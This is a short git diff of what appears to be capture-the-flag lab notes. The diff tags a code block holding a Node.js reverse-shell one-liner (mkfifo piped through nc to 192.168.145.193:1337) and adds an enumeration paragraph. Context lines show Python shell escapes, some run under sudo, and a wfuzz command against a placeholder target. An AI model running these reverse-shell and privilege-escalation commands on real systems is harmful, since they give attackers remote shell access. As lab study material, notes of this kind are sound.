@@ -40,7 +40,7 @@ sudo python3 -c 'import os; os.execl("/bin/sh", "sh")'
 ```
 python3 -c 'import os; os.execl("/bin/sh", "sh")'
 ```
-```
+```js
 require("child_process").exec('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.145.193 1337 >/tmp/f')
 ```
 ```
@@ -121,5 +121,12 @@ wfuzz -u http://TARGET/api/givegold -H "Content-Type: application/x-www-form-url
 # Exploiting and Investigation
 ---
 ## Enumerating the server
+After initial enumeration, the typical ports **`80`** and **`22`** are open. After opening the site, the page greets with two sign up / login options. Signing up gives you 1 free Gold. Logging in with SQLi seems to have no effect.
+
+
+
 ## User flag
+
+
+
 ## Root flag
